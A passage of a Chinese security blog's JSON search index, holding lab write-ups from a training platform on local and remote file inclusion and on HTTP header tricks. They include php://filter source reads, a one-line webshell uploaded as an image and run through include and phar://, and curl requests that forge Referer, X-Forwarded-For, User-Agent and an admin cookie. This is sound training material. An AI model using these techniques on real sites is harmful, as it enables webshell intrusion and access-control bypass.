1http://47.105.75.177/vulnlab/upload/denglu/upload/1_dama1.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"实验-文件包含漏洞","slug":"合天培训_实验_文件包含漏洞","date":"2020-05-01T04:51:26.000Z","updated":"2020-05-01T09:03:19.921Z","comments":true,"path":"web/合天培训_实验_文件包含漏洞/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"文件包含漏洞实验 gwolfs ## 本地文件包含 （1）提示include.php，访问include.php （2）提示参数为file.利用file=include.php发现文件包含生效。 （3）尝试读取源代码 1file=php://filter/convert.base64-encode/resource=include.php base64解码后： 123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :) &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file); &#125; &#125;?&gt; 可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。 （4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。 上传一个一句话木马post.php。发现上传失败 因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png. 上传成功： 接下来进行文件包含。 http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png 利用菜刀连接即可。 远程文件包含（1）参数有file,提示php文件。代表只输入文件名就可以。 猜测代码： 12$file=$_GET['file'].\"php\";include($file); （2）读源码 file=php://filter/convert.base64-encode/resource=include 123456789101112131415161718&lt;html&gt;Tips: &lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET[\"file\"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,\"..\") !== FALSE || strlen($file)&gt;=70) &#123; echo \"&lt;p&gt; error! &lt;/p&gt;\"; &#125; else &#123; include($file.'.php'); &#125; &#125;?&gt; 题目要求phar，现在上传一个zip文件。 发现不能上传zip。抓包看下是基于什么机制过滤的。 发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg 然后利用phar协议访问zip中的post.php 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://upload/webshell.jpg/post.php 用菜刀连接尝试,发现连接失败。 看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径： 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar://../1/upload/webshell.jpg/post.php 发现报错error。 再想一下，不仅忘记去掉后缀名php了，而且不支持.. 尝试使用绝对路径 1http://47.105.75.177/vulnlab/include/2/include.php?file=phar:///var/www/html/vulnlab/include/1/upload/webshell.jpg/post 菜刀连接，成功连接","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"实验_web安全之HTTP头部字段理解","slug":"合天培训_实验_web安全之HTTP头部字段理解","date":"2020-04-30T12:55:32.000Z","updated":"2020-05-01T09:03:02.917Z","comments":true,"path":"web/合天培训_实验_web安全之HTTP头部字段理解/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/","excerpt":"","text":"web安全之HTTP头部字段理解第一题 观察HTTP 响应头题目提示观察http响应头所以只观察响应头即可。通过命令 1curl -v 47.105.75.177/vulnlab/head/1.php 得到: 1key: hello world! 第二题 Referer理解提示必须从www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段 通过命令 1curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php 从响应中获取key: 1key: you are right 第三题 X-Forwarded-For理解通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 http://www.hetianlab.com/ 。先curl下： 1curl 47.105.75.177/vulnlab/head/3.php 得到： 1this page only accept come from localhost 本地才能访问，所以伪造X-Forwarded-For为127.0.0.1 1curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php 得到key 1key: you are right 第四题 User-Agent理解题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令： 1curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php 得到key: 1key: you are right 第五题 Accept-Language理解 题目提示只允许外国人登录,猜测接收语言为英语即可。 1curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php 第六题 Cookie理解题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。 1curl -v 47.105.75.177/vulnlab/head/6.php 发现响应头中会设置cookie: 1Set-Cookie: Login=anonymous 所以请求时将cookie设置为Login=admin即可。 1curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}],"categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"},{"name":"命令执行","slug":"命令执行","permalink":"http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"文件上传","slug":"文件上传","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"文件包含","slug":"文件包含","permalink":"http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}